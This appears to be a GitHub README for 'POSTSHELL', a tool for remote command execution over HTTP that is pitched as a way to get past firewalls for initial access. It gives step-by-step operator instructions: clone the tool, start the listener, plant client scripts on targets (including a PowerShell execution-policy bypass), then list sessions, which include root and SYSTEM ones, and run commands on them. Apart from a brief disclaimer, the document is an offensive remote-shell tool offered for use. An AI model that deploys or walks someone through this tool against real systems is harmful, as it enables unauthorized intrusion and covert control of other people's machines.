```
██████╗  ██████╗ ███████╗████████╗███████╗██╗  ██╗███████╗██╗     ██╗     
██╔══██╗██╔═══██╗██╔════╝╚══██╔══╝██╔════╝██║  ██║██╔════╝██║     ██║     
██████╔╝██║   ██║███████╗   ██║   ███████╗███████║█████╗  ██║     ██║     
██╔═══╝ ██║   ██║╚════██║   ██║   ╚════██║██╔══██║██╔══╝  ██║     ██║     
██║     ╚██████╔╝███████║   ██║   ███████║██║  ██║███████╗███████╗███████╗
╚═╝      ╚═════╝ ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
```
Execute commands on clients using GET/POST requests. (Bypass Firewalls for initial access)

There are some limitations, however, can be very useful if firewall is blocking standard reverse shells.

How post shell works:
  - Listens for http requests on user specified port
  - Client scripts connect to the server using POST requests, submitting machine information
  - Client scripts continue to GET commands from the server, execute the commands, then POST results back to the server 

# Disclaimer
This is not meant to be used for illegal purposes. Use at your own risk.

# Getting Started
1. Download POSTSHELL
```
git clone https://github.com/bwithe/postshell
```

# Usage
1. To start the server
```
python3 postshell.py <port>
```

2. Modify the following, then transfer a client.<script> to connect to the SERVER
  - IP
  - PORT
  - WAITTIME

3. Execute the script on the client
```
bash client.sh

python3 client.py

powershell -ep bypass client.ps1
```

4. To see active clients
```
postshell> list 
╔════╦═════════════════╦═════════════════╦═════════╦════════════════╦══════════════════╦════════╗
║ ID ║ IP              ║ HOSTNAME        ║ USER    ║ OS             ║ VERSION          ║ ARCH   ║
╠════╬═════════════════╬═════════════════╬═════════╬════════════════╬══════════════════╬════════╣
║ 1  ║ 192.168.193.131 ║ ubuntu          ║ ubuntu  ║ Linux          ║ 6.8.0-41-generic ║        ║
║ 2  ║ 192.168.193.131 ║ ubuntu          ║ root    ║ Linux          ║ 6.8.0-41-generic ║        ║
║ 3  ║ 192.168.193.129 ║ DESKTOP-P5KACDB ║ jimothy ║ Windows 10 Pro ║ 10.0.19045       ║ 64-bit ║
║ 4  ║ 192.168.193.129 ║ DESKTOP-P5KACDB ║ system  ║ Windows 10 Pro ║ 10.0.19045       ║ 64-bit ║
╚════╩═════════════════╩═════════════════╩═════════╩════════════════╩══════════════════╩════════╝
```

5. To connect to an active session
```
postshell> select 3
[jimothy@DESKTOP-P5KACDB]>
```

6. Execute commands, and wait for the client to GET the command, then POST the results
```
[jimothy@DESKTOP-P5KACDB]> pwd
C:\Users\jimothy\Downloads
```
  
7. To background a session
```
[jimothy@DESKTOP-P5KACDB]> background
```

8. To kill the current session
```
[jimothy@DESKTOP-P5KACDB]> die
```

9. Kill an active session from the menu
```
postshell> kill 3
[!] Sent kill command to jimothy@DESKTOP-P5KACDB
```

10. To kill all sessions, and exit POSTSHELL
```
postshell> exit 
[!] Shutting down server and all sessions.
```
